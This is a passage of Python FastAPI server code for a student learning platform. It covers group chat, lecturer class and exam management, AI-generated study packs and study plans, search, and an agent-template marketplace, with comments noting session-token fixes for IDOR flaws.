    return {
        "id":          m.get("id"),
        "sender":      m.get("sid") or m.get("sender"),
        "sender_name": m.get("sender_name") or m.get("name") or "Student",
        "text":        m.get("text") if m.get("text") is not None else m.get("message", ""),
        "date":        m.get("date", ""),
    }


@app.post("/api/group/message")
async def send_group_message(data: dict, request: Request):
    sid, tok_name = _resolve_token(data)   # IDOR fix: identity from session token, not body
    gid     = sanitize_text(str(data.get("group_id","")), 20)
    # Accept both `text` (current frontend) and `message` (legacy) so content is never dropped.
    content = sanitize_text(str(data.get("text") or data.get("message") or "").strip(), 1000)
    name    = sanitize_text(str(tok_name or "Student"), MAX_NAME_LEN)
    if not content: raise HTTPException(400, "Message content required.")
    groups  = load_groups()
    if gid not in groups: raise HTTPException(404, "Group not found")
    if sid not in groups[gid]["members"]: raise HTTPException(403, "Not a member")

    # Atomic per-row store (cross-worker safe; no read-modify-write race on groups.json).
    if db.is_available():
        row = await asyncio.to_thread(db.send_org_message, _grp_oid(gid), "main", sid, name, content)
        if not row: raise HTTPException(500, "Failed to send message.")
        return {"ok": True, "msg": _grp_msg_from_row(row)}

    # File fallback (no DB): legacy append, stored in the normalized shape.
    msg = {
        "id":          str(uuid.uuid4())[:8],
        "sid":         sid,
        "sender_name": name,
        "text":        content,
        "date":        datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    }
    groups[gid].setdefault("messages", []).append(msg)
    groups[gid]["messages"] = groups[gid]["messages"][-300:]
    save_groups(groups)
    return {"ok": True, "msg": {**_grp_msg_normalize(msg)}}


@app.get("/api/group/messages")
async def get_group_messages(group_id: str, sid: str = "", token: str = ""):
    # Auth is by session token only; the `sid` query param is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(token, 100)) if token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid    = sess["sid"]
    gid    = sanitize_text(group_id, 20)
    groups = load_groups()
    if gid not in groups: raise HTTPException(404, "Group not found")
    if sid not in groups[gid]["members"]: raise HTTPException(403, "Not a member")
    if db.is_available():
        rows = await asyncio.to_thread(db.get_org_messages, _grp_oid(gid), "main", 100)
        return {"messages": [_grp_msg_from_row(r) for r in rows], "name": groups[gid]["name"]}
    msgs = [_grp_msg_normalize(m) for m in groups[gid].get("messages", [])[-100:]]
    return {"messages": msgs, "name": groups[gid]["name"]}


@app.get("/api/group/chat/stream")
async def group_chat_stream(token: str = "", group_id: str = "", last_id: int = 0, request: Request = None):
    """SSE for study-group chat — DB-polls org_messages so every worker (and so
    every connected member) sees the same live feed."""
    entry = get_session_from_token(sanitize_text(token, 100))
    if not entry: raise HTTPException(401, "Invalid token.")
    sid = entry["sid"]
    gid = sanitize_text(group_id, 20)
    if not db.is_available(): raise HTTPException(503, "DB unavailable.")
    groups = load_groups()
    if gid not in groups: raise HTTPException(404, "Group not found")
    if sid not in groups[gid]["members"]: raise HTTPException(403, "Not a member")
    oid = _grp_oid(gid)
    cursor = max(0, int(last_id))

    async def stream():
        nonlocal cursor
        while True:
            if request and await request.is_disconnected():
                break
            rows = await asyncio.to_thread(db.get_org_messages_since, oid, cursor)
            if rows:
                for r in rows:
                    cursor = r["id"]
                    yield f"data: {json.dumps(_grp_msg_from_row(r))}\n\n"
            else:
                yield ": ping\n\n"
            await asyncio.sleep(2)

    return StreamingResponse(
        stream(),
        media_type="text/event-stream",
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no","Connection":"keep-alive"},
    )


# ── Dynamic class routes (lecturer management) ───────────────

@app.get("/api/class/lecturer/all")
async def lecturer_all_classes(token: str, lecturer: str = ""):
    """Get all classes for a specific lecturer."""
    verify_lecturer(token)
    classes = load_classes()
    result  = []
    for code, cls in classes.items():
        if not lecturer or cls.get("lecturer","").lower() == lecturer.lower():
            result.append({**cls, "code": code, "student_count": len(cls.get("students",[]))})
    return {"classes": result}


@app.get("/api/class/{code}/lecturer")
async def class_detail_lecturer(code: str, token: str):
    """Get full class detail for lecturer (includes student list)."""
    verify_lecturer(token)
    classes = load_classes()
    code    = code.upper()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    cls = dict(classes[code])
    cls["code"]          = code
    cls["student_count"] = len(cls.get("students",[]))
    return cls


@app.post("/api/class/{code}/material")
async def add_material_dynamic(code: str, req: MaterialRequest):
    """Add material to a class."""
    verify_lecturer(req.token)
    classes = load_classes()
    code    = code.upper()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    material = {
        "id":      str(uuid.uuid4())[:8],
        "title":   sanitize_text(req.title, 200),
        "content": sanitize_text(req.content, 2000),
        "url":     sanitize_text(req.url, 500),
        "type":    req.type if req.type in ["link","note","file"] else "note",
        "date":    datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    }
    classes[code].setdefault("materials",[]).append(material)
    save_classes(classes)
    return {"ok": True, "id": material["id"]}


@app.post("/api/class/{code}/material/delete")
async def delete_material(code: str, req: dict):
    """Delete a material from a class."""
    token       = req.get("token","")
    material_id = req.get("id","")
    verify_lecturer(token)
    classes = load_classes()
    code    = code.upper()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    classes[code]["materials"] = [
        m for m in classes[code].get("materials",[]) if m["id"] != material_id
    ]
    save_classes(classes)
    return {"ok": True}


@app.post("/api/class/{code}/assignment")
async def add_assignment_dynamic(code: str, req: AssignmentRequest):
    """Add assignment to a class."""
    verify_lecturer(req.token)
    classes = load_classes()
    code    = code.upper()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    assignment = {
        "id":          str(uuid.uuid4())[:8],
        "title":       sanitize_text(req.title, 200),
        "description": sanitize_text(req.description, 1000),
        "due_date":    sanitize_text(req.due_date, 50),
        "date":        datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
        "submissions": [],
    }
    classes[code].setdefault("assignments",[]).append(assignment)
    save_classes(classes)
    return {"ok": True, "id": assignment["id"]}


@app.post("/api/class/{code}/exam")
async def assign_exam_dynamic(code: str, req: AssignExamRequest):
    """Assign an exam to a class."""
    verify_lecturer(req.token)
    classes = load_classes()
    exams   = load_exams()
    code    = code.upper()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    exam = next((e for e in exams if e["id"] == req.exam_id), None)
    if not exam:
        raise HTTPException(404, "Exam not found")
    classes[code].setdefault("exams",[])
    if req.exam_id not in [e["id"] for e in classes[code]["exams"]]:
        classes[code]["exams"].append({
            "id": exam["id"], "title": exam["title"],
            "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
        })
    save_classes(classes)
    return {"ok": True}


@app.post("/api/class/{code}/link")
async def set_class_link(code: str, req: LiveClassRequest):
    """Set live class link."""
    verify_lecturer(req.token)
    classes = load_classes()
    code    = code.upper()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    classes[code]["live_class"] = {
        "link":  sanitize_text(req.link, 500),
        "title": sanitize_text(req.title, 200),
        "date":  datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    }
    save_classes(classes)
    return {"ok": True}


@app.get("/api/class/{code}/discuss")
async def get_class_discuss(code: str):
    """Get discussion messages for a class."""
    code    = code.upper()
    classes = load_classes()
    if code not in classes:
        raise HTTPException(404, "Class not found")
    return {"messages": classes[code].get("discussions",[])[-50:]}



# ── Study Haven ───────────────────────────────────────────────

STUDY_DECK_PROMPT = """You are Sivarr's Study Haven, an expert at turning raw lecture content into clean, structured study material.

A student uploaded the following lecture content:

{text}

Generate a comprehensive study pack with exactly these three sections:

---
## 📋 SUMMARY
Write a concise 4-6 sentence overview of the entire lecture. Capture the main argument, key theme, and why this topic matters.

---
## 📚 STRUCTURED NOTES

### [Main Topic 1]
- **Key Concept:** definition or explanation
- **Key Concept:** definition or explanation

### [Main Topic 2]
- **Key Concept:** definition or explanation
- **Key Concept:** definition or explanation

(continue for all major topics, using actual topic names from the content)

---
## ❓ PRACTICE QUESTIONS
Generate exactly 5 practice questions based on the content. Mix question types:
1. [Question]
2. [Question]
3. [Question]
4. [Question]
5. [Question]

Keep everything concise, clear and student-friendly. Use the actual content, don't make things up.
Never use em dashes. Use commas or periods instead.
"""


@app.post("/api/study-deck")
async def study_deck(request: Request, token: str = Form(""), file: UploadFile = File(...)):
    """Process uploaded lecture content and generate structured study material."""
    # Auth by session token (was: trusted a spoofable `sid` form field — IDOR fix).
    sess = get_session_from_token(sanitize_text(token, 100))
    if not sess:
        raise HTTPException(401, "Sign in to use Study Deck.")
    sid = sess["sid"]
    key = get_client_key(request, sid)
    check_rate_limit(key, 3, "study_deck")  # Strict limit — expensive operation
    _ai_meter(sid)

    allowed = [".txt", ".pdf", ".md"]
    ext     = Path(file.filename).suffix.lower()
    if ext not in allowed:
        raise HTTPException(400, "Use .txt, .pdf, or .md files only.")

    clen = request.headers.get("content-length")
    if clen and clen.isdigit() and int(clen) > MAX_FILE_SIZE + 8192:
        raise HTTPException(400, "File too large. Maximum 5MB.")
    content = await file.read()
    if len(content) > MAX_FILE_SIZE:
        raise HTTPException(400, "File too large. Maximum 5MB.")
    if not _validate_file_magic(content, ext):
        raise HTTPException(400, "File content does not match its extension.")

    text = await asyncio.to_thread(_extract_file_text, content, ext)
    text = sanitize_text(text, 8000)
    if not text.strip():
        raise HTTPException(400, "Could not extract text from file.")

    log.info(f"Study Haven processing: {file.filename} for {sid[:20]}")

    # Generate study pack
    result = await async_gemini_once(
        STUDY_DECK_PROMPT.format(text=text[:6000]),
        temp=0.4,
        tokens=2000,
    )

    if not result:
        raise HTTPException(503, "AI is busy right now. Try again in a moment.")

    return {
        "filename": file.filename,
        "result":   result,
        "chars":    len(text),
    }



# ══════════════════════════════════════════════════════════════════
#  ENHANCED EXAM SYSTEM
# ══════════════════════════════════════════════════════════════════

EXAM_RESULTS_PATH = DATA_DIR / "exam_results.json"
EXAM_SESSIONS_PATH = DATA_DIR / "exam_sessions.json"

# Exam results & sessions live in the generic `collections` table (DB-first), one
# row per record keyed by f"{sid}_{exam_id}". Concurrent student submissions are
# atomic per-record and never clobber one another — the old whole-file save lost
# grades under concurrency. Legacy JSON files are migrated lazily on first access
# (per worker) and used as a fallback only when no DB is configured.
_exam_results_migrated = False
_exam_sessions_migrated = False

def _save_json_atomic(path, data):
    tmp = str(path) + f".{os.getpid()}.{uuid.uuid4().hex[:8]}.tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    shutil.move(tmp, str(path))

def _migrate_exam_results():
    global _exam_results_migrated
    if _exam_results_migrated or not db.is_available():
        return
    _exam_results_migrated = True
    try:
        if EXAM_RESULTS_PATH.exists() and db.coll_count("exam_results") == 0:
            legacy = json.loads(EXAM_RESULTS_PATH.read_text(encoding="utf-8"))
            for r in (legacy if isinstance(legacy, list) else []):
                iid = f"{r.get('sid','')}_{r.get('exam_id','')}"
                db.coll_put("exam_results", iid, r, owner=str(r.get("exam_id", "")))
    except Exception as exc:
        log.warning(f"exam_results file→DB migrate failed: {exc}")

def _migrate_exam_sessions():
    global _exam_sessions_migrated
    if _exam_sessions_migrated or not db.is_available():
        return
    _exam_sessions_migrated = True
    try:
        if EXAM_SESSIONS_PATH.exists() and db.coll_count("exam_sessions") == 0:
            legacy = json.loads(EXAM_SESSIONS_PATH.read_text(encoding="utf-8"))
            for key, s in (legacy.items() if isinstance(legacy, dict) else []):
                db.coll_put("exam_sessions", key, s, owner=str(s.get("sid", "")))
    except Exception as exc:
        log.warning(f"exam_sessions file→DB migrate failed: {exc}")

def load_exam_results() -> list:
    """ALL results (lecturer/admin/student full views). DB-first; file fallback."""
    if db.is_available():
        _migrate_exam_results()
        return db.coll_list("exam_results")
    if EXAM_RESULTS_PATH.exists():
        try: return json.loads(EXAM_RESULTS_PATH.read_text(encoding="utf-8"))
        except: return []
    return []

def exam_result_exists(sid: str, exam_id: str) -> bool:
    if db.is_available():
        _migrate_exam_results()
        return db.coll_get("exam_results", f"{sid}_{exam_id}") is not None
    return any(r.get("sid") == sid and r.get("exam_id") == exam_id for r in load_exam_results())

def save_exam_result(result: dict) -> None:
    """Persist ONE result atomically — per-record upsert keyed by sid+exam_id."""
    if db.is_available():
        db.coll_put("exam_results",
                    f"{result.get('sid','')}_{result.get('exam_id','')}",
                    result, owner=str(result.get("exam_id", "")))
        return
    results = load_exam_results(); results.append(result)
    _save_json_atomic(EXAM_RESULTS_PATH, results)

def exam_results_for_exam(exam_id: str) -> list:
    if db.is_available():
        _migrate_exam_results()
        return db.coll_list("exam_results", owner=exam_id)
    return [r for r in load_exam_results() if r.get("exam_id") == exam_id]

def load_exam_sessions() -> dict:
    if EXAM_SESSIONS_PATH.exists():
        try: return json.loads(EXAM_SESSIONS_PATH.read_text(encoding="utf-8"))
        except: return {}
    return {}

def get_exam_session(sid: str, exam_id: str) -> dict | None:
    if db.is_available():
        _migrate_exam_sessions()
        return db.coll_get("exam_sessions", f"{sid}_{exam_id}")
    return load_exam_sessions().get(f"{sid}_{exam_id}")

def put_exam_session(sid: str, exam_id: str, session: dict) -> None:
    if db.is_available():
        db.coll_put("exam_sessions", f"{sid}_{exam_id}", session, owner=sid)
        return
    s = load_exam_sessions(); s[f"{sid}_{exam_id}"] = session
    _save_json_atomic(EXAM_SESSIONS_PATH, s)

def delete_exam_session(sid: str, exam_id: str) -> None:
    if db.is_available():
        db.coll_delete("exam_sessions", f"{sid}_{exam_id}")
        return
    s = load_exam_sessions(); s.pop(f"{sid}_{exam_id}", None)
    _save_json_atomic(EXAM_SESSIONS_PATH, s)


AI_EXAM_PROMPT = """You are an expert university exam question generator.
Generate exactly {count} high-quality multiple choice questions on the topic: "{topic}"
Difficulty level: {difficulty}
Question types to mix: {types}

Return ONLY a valid JSON array with no extra text. Each object must have:
{{
  "question": "Question text here",
  "options": {{"A": "option", "B": "option", "C": "option", "D": "option"}},
  "answer": "A",
  "explanation": "Why this is correct",
  "type": "mcq",
  "difficulty": "{difficulty}"
}}"""


@app.post("/api/exam/generate")
async def generate_exam_questions(data: dict, request: Request):
    """AI generates exam questions from a topic."""
    verify_lecturer(data.get("token", ""))
    topic      = sanitize_text(str(data.get("topic", "")), 200)
    count      = min(int(data.get("count", 20)), 50)
    difficulty = data.get("difficulty", "medium")
    qtypes     = data.get("types", ["mcq"])

    if not topic:
        raise HTTPException(400, "Topic is required")

    prompt = AI_EXAM_PROMPT.format(
        count=count, topic=topic, difficulty=difficulty,
        types=", ".join(qtypes)
    )

    result = await async_gemini_once(prompt, temp=0.7, tokens=4000)
    if not result:
        raise HTTPException(503, "AI unavailable, try again")

    # Parse JSON from AI response
    try:
        # Strip markdown fences if present
        clean = re.sub(r"```json|```", "", result).strip()
        questions = json.loads(clean)
        if not isinstance(questions, list):
            raise ValueError("Not a list")
    except Exception:
        raise HTTPException(500, "AI returned invalid format, try again")

    return {"ok": True, "questions": questions, "count": len(questions)}


@app.post("/api/exam/start")
async def start_exam(data: dict, request: Request):
    """Student starts an exam — returns shuffled unique question set."""
    sid, _  = _resolve_token(data)   # IDOR fix: sid from session token, body sid ignored
    exam_id = sanitize_text(str(data.get("exam_id", "")), 20)
    code    = sanitize_text(str(data.get("code", "")), 10).upper()

    if not exam_id:
        raise HTTPException(400, "Missing exam_id")
    # Academic integrity: only enrolled students may sit a class exam.
    if code:
        classes = load_classes()
        if code not in classes or sid not in classes[code].get("students", []):
            raise HTTPException(403, "You are not enrolled in this class.")

    # Load exam
    exams = load_exams()
    exam  = next((e for e in exams if e["id"] == exam_id), None)
    if not exam:
        raise HTTPException(404, "Exam not found")

    # Check if already submitted
    if exam_result_exists(sid, exam_id):
        raise HTTPException(409, "You have already submitted this exam")

    # Build shuffled question set for this student
    questions = exam.get("questions_full", exam.get("questions", []))
    qps       = min(exam.get("questions_per_student", 30), len(questions))

    # Shuffle and pick unique set seeded by sid for reproducibility
    import hashlib
    seed = int(hashlib.md5(f"{sid}{exam_id}".encode()).hexdigest(), 16) % (2**31)
    rng  = random.Random(seed)

    if questions and isinstance(questions[0], dict):
        selected = rng.sample(questions, min(qps, len(questions)))
        # Shuffle answer options for each question
        shuffled = []
        for q in selected:
            opts  = list(q.get("options", {}).items())
            rng.shuffle(opts)
            letter_map = {old: new for new, (old, _) in zip("ABCD", opts)}
            new_opts   = {new: val for new, (_, val) in zip("ABCD", opts)}
            new_ans    = letter_map.get(q.get("answer", "A"), "A")
            shuffled.append({**q, "options": new_opts, "answer": new_ans})
    else:
        # Legacy plain string questions
        selected  = rng.sample(questions, min(qps, len(questions)))
        shuffled  = [{"question": q, "options": {"A":"True","B":"False","C":"Maybe","D":"None"},
                      "answer":"A", "explanation":"", "type":"mcq"} for q in selected]

    # Store session (atomic per-record write)
    put_exam_session(sid, exam_id, {
        "sid": sid, "exam_id": exam_id, "code": code,
        "started_at": datetime.datetime.now().isoformat(),
        "duration":   exam.get("duration", 60),
        "questions":  shuffled,
        "answers":    {},
    })

    # Return questions WITHOUT answers
    safe_q = [{k: v for k, v in q.items() if k != "answer" and k != "explanation"}
              for q in shuffled]

    return {
        "ok":        True,
        "exam_id":   exam_id,
        "title":     exam.get("title", ""),
        "duration":  exam.get("duration", 60),
        "total":     len(shuffled),
        "questions": safe_q,
    }


@app.post("/api/exam/submit")
async def submit_exam(data: dict, request: Request):
    """Student submits completed exam — returns score + analysis."""
    sid, _  = _resolve_token(data)   # IDOR fix: sid from session token, body sid ignored
    exam_id = sanitize_text(str(data.get("exam_id", "")), 20)
    answers = data.get("answers", {})  # {question_index: "A"}

    session = get_exam_session(sid, exam_id)

    if not session:
        raise HTTPException(404, "Exam session not found (it may have expired)")

    questions   = session["questions"]
    correct     = 0
    breakdown   = []
    wrong_list  = []

    for i, q in enumerate(questions):
        student_ans = answers.get(str(i), "")
        is_correct  = student_ans == q.get("answer", "")
        if is_correct:
            correct += 1
        else:
            wrong_list.append({
                "question":    q.get("question", ""),
                "your_answer": student_ans,
                "correct":     q.get("answer", ""),
                "explanation": q.get("explanation", ""),
            })
        breakdown.append({
            "question":    q.get("question", ""),
            "your_answer": student_ans,
            "correct":     q.get("answer", ""),
            "is_correct":  is_correct,
            "explanation": q.get("explanation", ""),
        })

    total   = len(questions)
    score   = round((correct / total) * 100, 1) if total else 0
    grade   = "A" if score >= 70 else "B" if score >= 60 else "C" if score >= 50 else "F"
    time_taken = ""
    try:
        started = datetime.datetime.fromisoformat(session["started_at"])
        elapsed = (datetime.datetime.now() - started).seconds
        time_taken = f"{elapsed // 60}m {elapsed % 60}s"
    except: pass

    # Save result (atomic per-record upsert — concurrent submissions never clobber)
    save_exam_result({
        "sid":        sid,
        "exam_id":    exam_id,
        "code":       session.get("code", ""),
        "score":      score,
        "correct":    correct,
        "total":      total,
        "grade":      grade,
        "time_taken": time_taken,
        "submitted_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
        "breakdown":  breakdown,
    })

    # Clean up session
    delete_exam_session(sid, exam_id)

    return {
        "ok":        True,
        "score":     score,
        "correct":   correct,
        "total":     total,
        "grade":     grade,
        "time_taken": time_taken,
        "breakdown": breakdown,
        "wrong":     wrong_list,
    }


@app.get("/api/exam/results")
async def get_exam_results(exam_id: str, token: str):
    """Lecturer gets all results for an exam with analytics."""
    verify_lecturer(token)
    results = exam_results_for_exam(exam_id)
    if not results:
        return {"results": [], "analytics": {}}

    scores      = [r["score"] for r in results]
    avg         = round(sum(scores) / len(scores), 1)
    highest     = max(scores)
    lowest      = min(scores)
    pass_rate   = round(len([s for s in scores if s >= 50]) / len(scores) * 100, 1)

    # Find hardest questions (most wrong answers)
    wrong_counts = {}
    for r in results:
        for b in r.get("breakdown", []):
            if not b.get("is_correct"):
                q = b.get("question", "")[:80]
                wrong_counts[q] = wrong_counts.get(q, 0) + 1

    hardest = sorted(wrong_counts.items(), key=lambda x: x[1], reverse=True)[:3]

    return {
        "results": results,
        "analytics": {
            "total_submissions": len(results),
            "average_score":     avg,
            "highest_score":     highest,
            "lowest_score":      lowest,
            "pass_rate":         pass_rate,
            "hardest_questions": hardest,
            "grade_distribution": {
                "A": len([s for s in scores if s >= 70]),
                "B": len([s for s in scores if 60 <= s < 70]),
                "C": len([s for s in scores if 50 <= s < 60]),
                "F": len([s for s in scores if s < 50]),
            }
        }
    }


@app.get("/api/exam/student-results")
async def get_student_exam_results(sid: str = "", code: str = "", token: str = ""):
    """Get all exam results for a student."""
    # Auth is by session token only; the `sid` query param is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(token, 100)) if token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid     = sess["sid"]
    results = load_exam_results()
    student_results = [r for r in results if r["sid"] == sid]
    if code:
        student_results = [r for r in student_results if r.get("code") == code.upper()]
    return {"results": student_results}

# ── Health check ──────────────────────────────────────────────

class StudyPlanRequest(BaseModel):
    sid: str = ""
    token: str = ""
    subject: str
    exam_date: str
    hours_per_day: int = 2

@app.post("/api/study-plan")
async def generate_study_plan(req: StudyPlanRequest, request: Request):
    # Auth is by session token only; the body `sid` is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(req.token, 100)) if req.token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    key = get_client_key(request, sid)
    check_rate_limit(key, 5, "study_plan")
    _ai_meter(sid)

    subject = sanitize_text(req.subject, 100)
    if not subject:
        raise HTTPException(400, "Subject required.")

    today = datetime.date.today()
    try:
        exam = datetime.date.fromisoformat(req.exam_date)
    except ValueError:
        raise HTTPException(400, "Invalid date. Use YYYY-MM-DD.")

    days_left = (exam - today).days
    if days_left < 1:
        raise HTTPException(400, "Exam date must be in the future.")
    days_left = min(days_left, 14)

    hours = max(1, min(int(req.hours_per_day), 8))

    p    = load_progress(sid)
    weak = weak_topics(p)
    studied = list(p.get("topics", {}).keys())

    prompt = f"""You are Sivarr's study planner. Be specific, realistic and encouraging.
Student: {p.get('name', 'Student')}
Subject: {subject}
Days until exam: {days_left}
Hours per day: {hours}
Topics already studied: {', '.join(studied[:10]) or 'none yet'}
Weak topics needing focus: {', '.join(weak) or 'none identified'}

Create a {days_left}-day study plan. Prioritize weak topics early.
Reply ONLY with a valid JSON array — no markdown, no extra text:
[
  {{"day": 1, "date": "Mon 14 Apr", "focus": "Specific topic name", "tasks": ["Concrete task 1", "Concrete task 2", "Concrete task 3"], "hours": {hours}}},
  ...
]
Make tasks specific and actionable. Each day must have 2-4 tasks. Never use em dashes in any text field, use commas or periods instead."""

    raw = await async_gemini_once(prompt, temp=0.7, tokens=2000)
    if not raw:
        raise HTTPException(503, "Could not generate plan. Try again.")

    try:
        raw   = re.sub(r"```(?:json)?", "", raw).strip().rstrip("`")
        match = re.search(r'\[[\s\S]*\]', raw)
        plan  = json.loads(match.group(0) if match else raw)
    except Exception as e:
        log.error(f"Study plan parse error: {e} | raw: {raw[:200]}")
        raise HTTPException(503, "Could not parse plan. Try again.")

    log.info(f"Study plan generated: {req.sid[:20]} | {subject} | {days_left} days")
    return {"plan": plan, "days_left": days_left, "subject": subject, "exam_date": req.exam_date}

# Goals (load_goals/save_goals) and Journal (load_journal/save_journal) now live
# in routes/goals.py and routes/journal.py — imported back below via
# include_router, same pattern as tasks/habits/docs_notes.

# Skills (routes/skills.py) and Finance (routes/finance.py) sync/restore now
# live in their own route modules, same pattern as tasks/habits/docs/goals/journal.


# ═══════════════════════════════════════════════════════════════
#  UNIFIED SEARCH  — GET /api/search?q=&token=
# ═══════════════════════════════════════════════════════════════

@app.get("/api/search")
async def unified_search(q: str = "", token: str = ""):
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    q   = q.strip().lower()
    if len(q) < 2:
        return {"results": []}

    import re as _re
    results = []

    # ── Tasks ──────────────────────────────────────────────────
    for t in load_tasks(sid):
        if q in t.get("title", "").lower():
            results.append({
                "type": "task",
                "icon": "✅" if t.get("done") else "☐",
                "title": t["title"],
                "meta":  t.get("status", "todo"),
                "id":    t.get("id", ""),
            })

    # ── Goals ──────────────────────────────────────────────────
    for g in load_goals(sid):
        if q in g.get("title", "").lower() or q in g.get("subject", "").lower():
            results.append({
                "type":  "goal",
                "icon":  "🎯",
                "title": g["title"],
                "meta":  f'{g.get("progress", 0)}% complete',
                "id":    g.get("id", ""),
            })

    # ── Docs ───────────────────────────────────────────────────
    for d in load_docs(sid):
        title   = d.get("title", "").lower()
        content = d.get("content", "").lower()
        if q in title or q in content:
            snippet = ""
            idx = content.find(q)
            if idx >= 0:
                snippet = d["content"][max(0, idx - 30): idx + 70].strip()
            results.append({
                "type":  "doc",
                "icon":  "📄",
                "title": d.get("title") or "Untitled",
                "meta":  snippet or "",
                "id":    str(d.get("id", "")),
            })

    # ── Community posts ────────────────────────────────────────
    if db.is_available():
        try:
            posts = db.search_community_posts(q, limit=5)
            for p in posts:
                results.append({
                    "type":  "post",
                    "icon":  "💬",
                    "title": (p.get("content") or "")[:80],
                    "meta":  p.get("author_name", ""),
                    "id":    str(p.get("id", "")),
                })
        except Exception:
            pass

    # ── Skills ─────────────────────────────────────────────────
    if db.is_available():
        try:
            sk_blob = db.get_user_blob(sid, "skills") or {}
            for s in (sk_blob.get("skills") or []):
                name = s.get("name", "")
                cat  = s.get("category", "")
                if q in name.lower() or q in cat.lower():
                    results.append({
                        "type":  "skill",
                        "icon":  s.get("emoji", "🧠"),
                        "title": name,
                        "meta":  f'{s.get("level",0)}% · {cat}',
                        "id":    s.get("id", ""),
                    })
        except Exception:
            pass

    # ── Finance transactions ────────────────────────────────────
    if db.is_available():
        try:
            fin_blob = db.get_user_blob(sid, "finance") or {}
            for t in (fin_blob.get("transactions") or []):
                note = t.get("note", "")
                cat  = t.get("category", "")
                if q in note.lower() or q in cat.lower():
                    results.append({
                        "type":  "transaction",
                        "icon":  "💰" if t.get("type") == "income" else "💸",
                        "title": note or cat,
                        "meta":  f'₦{t.get("amount",0):,.0f} · {t.get("date","")}',
                        "id":    t.get("id", ""),
                    })
        except Exception:
            pass

    return {"results": results[:30]}

@app.post("/api/learning-hub/enroll")
async def enroll_course(data: dict):
    sid, _    = _resolve_token(data)
    course_id = sanitize_text(str(data.get("course_id", "")), 50)
    if not course_id:
        raise HTTPException(400, "Missing fields.")
    p = load_progress(sid)
    enrolled = p.get("enrolled_courses", [])
    if course_id not in enrolled:
        enrolled.append(course_id)
        p["enrolled_courses"] = enrolled
        save_progress(sid, p)
    return {"ok": True, "enrolled": enrolled}


@app.get("/api/learning-hub/enrolled")
async def get_enrolled(sid: str = "", token: str = ""):
    # Auth is by session token only; the `sid` query param is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(token, 100)) if token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    p = load_progress(sess["sid"])
    return {"enrolled": p.get("enrolled_courses", [])}


# ═══════════════════════════════════════════════════════════════
#  AGENTS MARKETPLACE API
# ═══════════════════════════════════════════════════════════════

# ── Public marketplace endpoints ──────────────────────────────

@app.get("/api/agents/templates")
async def ag_list_templates(
    category: str = "all", sort: str = "popular",
    free_only: bool = False, limit: int = 60,
):
    ck = f"tmpl:{category}:{sort}:{free_only}:{limit}"
    cached = _rc_get(ck)
    if cached is not None:
        return cached
    if not db.is_available():
        result = {"templates": _ag_demo_templates()}
        _rc_set(ck, result, ttl=120)
        return result
    # agent_name + agent_verified come from the JOIN in get_templates — no N+1
    templates = await asyncio.to_thread(
        db.get_templates,
        None if category == "all" else category,
        sort, free_only, limit,
    )
    result = {"templates": templates}
    _rc_set(ck, result, ttl=120)
    return result


@app.get("/api/agents/templates/{template_id}")
async def ag_get_template(template_id: str):
    template_id = sanitize_text(template_id, 60)
    if not db.is_available():
        return {"template": {}}
    t = db.get_template_by_id(template_id)
    if not t:
        raise HTTPException(404, "Template not found.")
    agent = db.get_agent_by_id(t.get("agent_id",""))
    t["agent_name"]     = agent.get("display_name","") if agent else ""
    t["agent_verified"] = agent.get("verified", False) if agent else False
    t["reviews"] = db.get_template_reviews(template_id, limit=5)
    return {"template": t}


@app.get("/api/agents/featured")
async def ag_featured():
    if not db.is_available():
        demos = _ag_demo_templates()
        return {"template": demos[0] if demos else {}}
    t = db.get_featured_template()
    return {"template": t}


@app.get("/api/agents")
async def ag_list_agents(sort: str = "downloads"):
    if not db.is_available():
        return {"agents": []}
    agents = db.get_all_agents(sort=sort)
    return {"agents": agents}


@app.get("/api/agents/{agent_id}")
async def ag_get_agent(agent_id: str):
    agent_id = sanitize_text(agent_id, 60)
    if not db.is_available():
        raise HTTPException(404, "Agent not found.")
    agent = db.get_agent_by_id(agent_id)
    if not agent:
        raise HTTPException(404, "Agent not found.")
    agent["templates"] = db.get_agent_templates(agent_id)
    return {"agent": agent}


# ── Template install ──────────────────────────────────────────

@app.post("/api/agents/templates/{template_id}/install")
async def ag_install_free(template_id: str, data: dict):
    sid, _ = _resolve_token(data)
    template_id = sanitize_text(template_id, 60)
    if not db.is_available():
        raise HTTPException(503, "DB unavailable.")
    t = db.get_template_by_id(template_id)
    if not t:
        raise HTTPException(404, "Template not found.")
    if float(t.get("price", 0)) > 0:
        raise HTTPException(400, "This is a paid template. Use the checkout flow.")
    if db.check_download(sid, template_id):
        return {"ok": True, "already_owned": True}
    # Quota gating: cap installed templates on limited plans (re-installs above are free).
    _tpl_cap = _plan_caps(load_progress(sid)).get("templates")
    if _tpl_cap is not None and db.count_downloads(sid) >= _tpl_cap:
        raise HTTPException(402, f"Your plan includes {_tpl_cap} templates. Upgrade to install more.")
    dl_id = uuid.uuid4().hex[:20]
    db.record_download({
        "id": dl_id, "template_id": template_id, "buyer_sid": sid,
        "agent_id": t["agent_id"], "gross_amount": 0,
        "sivarr_fee": 0, "agent_earnings": 0, "status": "completed",
    })
    return {"ok": True, "contents": t.get("contents", {})}


@app.get("/api/agents/templates/{template_id}/owned")
async def ag_check_owned(template_id: str, token: str = ""):
    if not token or not db.is_available():
